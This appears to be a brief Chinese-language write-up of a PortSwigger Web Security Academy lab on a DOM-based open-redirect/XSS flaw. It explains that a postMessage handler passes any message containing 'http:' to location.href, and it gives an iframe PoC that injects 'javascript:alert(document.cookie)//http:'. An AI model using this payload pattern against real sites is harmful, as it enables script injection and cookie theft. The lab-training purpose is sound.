

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/基于DOM的漏洞/images/3BADA327747846B8AFA9722D957622CAclipboard.png)

url.indexOf('http:')>-1  表示提交的参数必须含有http:

将接收到的url，使用location.href跳转。location.href可以使用javascript协议执行js代码



poc:

```javascript
<iframe src="//ac6e1f531ec480af801c615400ba00e6.web-security-academy.net/" 
//获取http:前面的内容，所以这里使用注释符
onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
```

